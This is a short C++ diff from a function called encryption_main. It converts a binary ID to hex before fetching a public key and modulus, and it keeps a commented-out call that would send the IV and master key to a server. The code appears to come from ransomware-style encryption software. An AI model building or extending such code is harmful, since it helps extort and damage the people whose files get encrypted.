@@ -60,6 +60,7 @@ int encryption_main( bool fromStart) {
 	std::fstream IDFile, pubFile;
 	Status status;
 	PBYTE id = nullptr;
+	string strID;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
 	vector<string> processed;
@@ -80,8 +81,11 @@ int encryption_main( bool fromStart) {
 	{
 		goto CLEAN;
 	}
+	
+	strID.assign((char*)id, ID_LEN);
+	strID = string_to_hex(strID);
 
-	status = getPublicParams(id, mod, pubKey);
+	status = getPublicParams(strID, mod, pubKey);
 	//status = sendIVAndKeyToServer(masterIV,masterKey,id);
 	if(!NT_SUCCESS(status))
 	{
